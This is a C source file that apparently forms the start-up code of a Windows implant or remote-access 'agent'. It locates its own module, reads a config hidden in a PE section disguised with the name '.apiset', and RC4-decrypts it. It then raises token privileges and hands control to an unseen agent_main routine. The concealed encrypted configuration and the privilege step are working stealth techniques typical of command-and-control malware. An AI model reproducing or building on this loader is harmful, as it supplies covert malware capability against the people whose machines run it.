#include <Windows.h>
#include <libloaderapi.h>
#include <processthreadsapi.h>
#include <process.h>
#include <stddef.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include "agent_utility.h"

#pragma comment(lib, "IPHLPAPI.lib")

extern void agent_main(char* jconfig, char const* prog_name);
extern bool adjust_token_privileges(void);

static HMODULE GetCurrentModuleHandle(void) {
	HMODULE hModule = 0;
	MEMORY_BASIC_INFORMATION memInfo = { 0 };
	if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)GetCurrentModuleHandle, &hModule)) {
		size_t size = sizeof(MEMORY_BASIC_INFORMATION);
		size = VirtualQuery((void*)GetCurrentModuleHandle, &memInfo, size);
		hModule = (HMODULE)memInfo.AllocationBase;
	}
	return hModule;
}

static char* read_config(void) {
	uint8_t* config = ZERO(uint8_t);
	HMODULE hModule = GetCurrentModuleHandle();
	uint8_t* section_content = NULL;

	// read the configu from the PE section
	const uint8_t section_name[] = { '.', 'a', 'p', 'i', 's', 'e', 't' };
	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)((uint8_t*)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
	uint32_t num_of_sections = pe->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pe);
	
	do
	{
		if (!memcmp(&pSection->Name, section_name, sizeof section_name)) {
			section_content = (intptr_t)hModule + (intptr_t)pSection->VirtualAddress;
			break;
		}
		pSection += 1;
		num_of_sections -= 1;
	} while (num_of_sections);
	if (!section_content) goto fail;

	config = MEM_ALLOC(pSection->SizeOfRawData + 1);
	if (!config) goto fail;
	memcpy(config, section_content, pSection->SizeOfRawData);

	rc4(pSection->SizeOfRawData, config);
	config[pSection->SizeOfRawData] = 0;
	return (char*)config;

fail:
	return ZERO(char);
}

void win_main(void* args) 
{
	adjust_token_privileges();
	char* jconfig = ZERO(char);
	jconfig = read_config();
	if (!jconfig) return;
	char* prog_name[MAX_PATH] = { 0 };
	GetModuleFileName((HMODULE)args, (LPSTR)prog_name, sizeof prog_name);
	agent_main(jconfig + 32, (char const*)prog_name);
	FREE(jconfig);
}
